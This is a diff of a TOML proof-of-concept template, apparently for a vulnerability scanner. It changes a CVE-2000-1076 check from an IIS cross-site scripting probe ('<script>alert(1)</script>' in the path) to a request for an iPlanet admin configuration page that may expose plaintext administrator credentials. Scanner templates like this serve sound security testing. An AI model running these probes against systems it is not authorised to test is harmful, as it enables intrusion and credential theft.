@@ -1,29 +1,36 @@
 [info]
-author = "AVE"
-description = "检测目标是否存在 IIS 跨站脚本漏洞"
+author = "ave"
+description = "验证目标iPlanet证书管理系统或目录服务器的管理员密码是否以明文形式存储在配置文件中，可通过HTTP访问管理控制台配置页面获取管理员凭证"
 id = "POC-AVE-2000-1988"
 name = "CVE-2000-1076 PoC"
-severity = "medium"
-tags = ["cve-2000-1076"]
+severity = "critical"
+tags = ["ave-2000-1988"]
 vuln_id = [
     "CVE-2000-1076",
     "AVE-2000-1988",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/<script>alert(1)</script>.asp"
+path = "/console/config/admin"
 protocol = "http"
 
 [poc.requests.body]
 content = ""
 type = "raw"
 
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["<script>alert(1)</script>"]
+words = [
+    "password",
+    "admin",
+    "plaintext",
+]
